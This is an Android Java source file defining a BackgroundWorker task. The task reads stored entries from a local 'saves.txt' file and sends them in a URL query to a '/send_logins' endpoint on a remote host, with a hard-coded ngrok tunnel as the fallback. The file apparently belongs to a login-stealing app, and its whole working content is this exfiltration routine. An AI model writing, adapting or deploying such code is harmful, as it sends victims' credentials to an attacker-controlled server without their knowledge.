package com.example.inprint;

import android.os.AsyncTask;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Scanner;

class BackgroundWorker extends AsyncTask<String, Void, Void> {
    @Override
    protected Void doInBackground(String... params) {

        URL url = null;
        try {
            File saves = new File(Activity2.getAppcontext().getFilesDir(), "saves.txt");
            Scanner scanner = new Scanner(new FileInputStream(saves));
            String u = MainActivity.getIp() + "/send_logins?data=";
            while (scanner.hasNextLine()) {
                u += scanner.nextLine();
            }
            url = new URL(u);
        } catch (Exception e) {
            try {
                url = new URL("http://395cfc6d.ngrok.io/send_logins?data={}");
            } catch (MalformedURLException e1) {
                e1.printStackTrace();
            }
            e.printStackTrace();
        }
        HttpURLConnection urlConnection = null;
        try {
            urlConnection = (HttpURLConnection) url.openConnection();
        } catch (IOException e) {
            e.printStackTrace();
        }
        try {
            InputStream in = new BufferedInputStream(urlConnection.getInputStream());
            Scanner scanner = new Scanner(in);
            System.out.println(scanner.nextLine());
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
//            try {
//                InputStream inputStream;
//
//                int status = urlConnection.getResponseCode();
//
//                if (status != HttpURLConnection.HTTP_OK)
//                    inputStream = urlConnection.getErrorStream();
//                else
//                    inputStream = urlConnection.getInputStream();
//                System.out.println(urlConnection.getResponseCode());
////                Scanner scanner = new Scanner(inputStream);
////                System.out.println(scanner.nextLine());
//            } catch (IOException e) {
//                e.printStackTrace();dw2rq
//            }
            urlConnection.disconnect();
        }
        System.out.println("sent");
        return null;
    }
}